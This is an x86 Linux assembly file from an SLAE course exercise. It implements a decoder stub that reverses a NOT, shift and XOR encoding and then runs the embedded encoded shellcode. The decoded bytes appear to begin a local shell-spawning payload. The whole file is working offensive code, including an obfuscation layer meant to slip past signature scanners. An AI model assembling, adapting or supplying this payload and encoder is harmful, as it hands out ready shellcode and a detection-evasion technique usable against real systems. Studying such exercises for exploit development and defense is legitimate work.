; Title		: [NOT +SHIFT-N+ XOR-N] encoded shellcode
; Date		:
; Author	: Pedro Cabral
; Blog Post	:
; Twitter	: https://twitter.com/CabrallPedro
; LinkedIn	: https://www.linkedin.com/in/pedro-cabral1992
; SLAE ID	: SLAE-1372
; Tested on	: i686 GNU/Linux

global _start

section .text

_start:

jmp short enc

decoder:
xor ecx,ecx
mul ecx

pop esi
mov cx,[esi]
inc esi
inc esi
mov bx, [esi]
inc esi
inc esi

push esi
mov edi, esi
main:

mov ax,[esi]
xor ax, bx
jz call_decoded
shr ax, cl
not word ax
mov [edi], al
inc esi
inc esi
inc edi
jmp short main

call_decoded:
call [esp]

enc:
call decoder
encoded: dw 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0x839, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0xce9, 0xc59, 0xc29, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539

